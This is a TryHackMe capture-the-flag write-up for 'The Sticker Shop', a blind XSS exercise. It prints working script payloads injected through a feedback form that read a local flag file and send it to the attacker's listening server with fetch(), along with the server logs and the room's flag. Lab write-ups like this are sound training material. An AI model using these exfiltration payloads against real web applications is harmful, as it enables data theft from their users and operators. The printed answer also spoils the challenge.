## The Sticker Shop - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/thestickershop)

**IP: 10.10.156.4**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Web <br>

**Tools Used**: /<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🌐 Web Exploitation

- I run the Nmap scan just out of habit. We need to access the `http://target:8080/flag.txt` in order to beat the challenge.

  ```
  $ nmap -sC -sV -p- 10.10.156.4

  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)
  |   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)
  |_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)
  8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.8.10)
  |_http-title: Cat Sticker Shop
  |_http-server-header: Werkzeug/3.0.1 Python/3.8.10
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- So there's nothing on this static website except providing feedback and `401 UNAUTHORIZED` when you try to visit the flag location. This smells like XSS.

- Here, I tried multiple payloads and this one worked. Also, start a Python server so you can actually get a response since we are working with Blind XSS.

  ```
  </textarea><script>fetch('http://[YOUR-THM-IP]:80');</script>

  $ python3 -m http.server 80                                                          
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.156.4 - - [09/Jun/2025 15:59:21] "GET / HTTP/1.1" 200 -
  ```
  
- Vulnerability confirmed! Target tried to download nothing from our server. Now, this took a while until I found a right payload. Googling and trying is the key, even AI wont be able to help you here.
  Keep the Python server running, paste this payload and you will get a flag on your server!

  ```
  </textarea><script>async function a() {const res1 = await fetch('http://127.0.0.1:8080/flag.txt');const b = await res1.text();const res2 = await fetch('http://[YOUR-THM-IP]:80?a=' + b);}a();</script>

  python3 -m http.server 80
  
  10.10.156.4 - - [09/Jun/2025 16:00:13] "GET /?a=THM{83789a69074f636f64a38879cfcabe8b62305ee6} HTTP/1.1" 200 -
  10.10.156.4 - - [09/Jun/2025 16:00:23] "GET /?a=THM{83789a69074f636f64a38879cfcabe8b62305ee6} HTTP/1.1" 200 -
  10.10.156.4 - - [09/Jun/2025 16:00:33] "GET /?a=THM{83789a69074f636f64a38879cfcabe8b62305ee6} HTTP/1.1" 200 -
  ```

- There is a another payload that will work as well. This one is much easier to craft since it doesn't require knowledge of asynchronous handling in JavaScript.

  ```
    '"><script>
    fetch('http://127.0.0.1:8080/flag.txt')
      .then(response => response.text())
      .then(data => {
        fetch('http://[YOUR-THM-IP]:80/?flag=' + encodeURIComponent(data));
      });
  </script>

  $ python3 -m http.server 80
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.156.4 - - [09/Jun/2025 15:46:43] "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -
  10.10.156.4 - - [09/Jun/2025 15:46:53] "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -
  10.10.156.4 - - [09/Jun/2025 15:47:03] "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -
  10.10.156.4 - - [09/Jun/2025 15:47:13] "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -
  ```

- URL decode the flag and submit it.
  
---

## 🏁 Flags

- **Flag**: `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding the right payload.`

- What did I learn?
  `How to exploit blind XSS.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
